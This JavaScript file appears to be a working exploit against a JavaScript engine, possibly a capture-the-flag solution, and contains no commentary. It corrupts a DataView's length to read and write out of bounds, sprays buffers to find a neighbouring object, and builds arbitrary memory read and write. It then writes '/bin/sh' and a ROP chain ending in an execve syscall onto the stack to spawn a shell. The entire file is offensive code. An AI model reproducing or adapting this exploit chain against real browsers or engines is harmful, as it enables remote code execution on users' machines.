function write32(view,off,val){
	for(let i=0;i<4;i++){
		view.setUint8(off+i,(val>>(i*8))&0xff);
	}
}

function read32(view,off){
	let r = BigInt(0)
	for(let i=0;i<4;i++){
		r += BigInt(view.getUint8(off+i))<<BigInt(i*8)
	}
	return parseInt(r)
}
let things = []
let offset = 0
let v
for(let i=0;i<20000000;i++){
	let buffer;buffer = new ArrayBuffer(0x80);
	let view;view = new DataView(buffer);
	view.byteLength = 0x300
	for(let j=0x80;j<0x300-8;j+=0x8){
		if(read32(view,j) == 0x80 && read32(view,j+8) == 0x80 && read32(view,j-0x78) == 0x87b3de){
			i = -1
			offset = j
			v = view
			break;
		}
	}
	things.push(view)
	if(i == -1) break;
}

// console.log(offset)
// console.log(read32(v,offset-0x78))
// 0x0000007d0e30
// 5
// -0x78
v.getUint32(0)
write32(v,offset-8,0x400000)
write32(v,offset-8+4,0x0)
let victim = null
for(let e of things){
	if(e.getUint8(1) == 0x45){
		victim = e
	}
}


let towrite = [0x48b526,0xbc9550,0x0000000000475647,0,0,0,0,0,0,0x0000000000484878,0,0x0000000000627c62,0,0x000000000040165b,0x3b,0x0000000000413acd]

write32(v,offset-8,0x000000bc9550)
write32(v,offset-8+4,0)
write32(victim,0,0x6e69622f)
write32(v,offset-8,0x000000bc9550+4)
write32(v,offset-8+4,0)
write32(victim,0,0x0068732f)

write32(v,offset-8,0xd32590)
write32(v,offset-8+4,0)
let stackLow = read32(victim,0)
write32(v,offset-8,0xd32594)
let stackHigh = read32(victim,0)

write32(v,offset-8,0xd34400)
write32(v,offset-8+4,0)
write32(victim,0,0x6e69622f)
write32(v,offset-8,0xd34400+4)
write32(v,offset-8+4,0)
write32(victim,0,0x68732f)



write32(v,offset-8,stackLow-816-16)
write32(v,offset-8+4,stackHigh)
for(let i=0;i<towrite.length;i++){
	write32(victim,i*8,towrite[i])
	write32(victim,i*8+4,0)
}
let q = []
for(let i=0;i<10000000;i++){
	q.push(new ArrayBuffer(0x10000))
}
// while(1){}
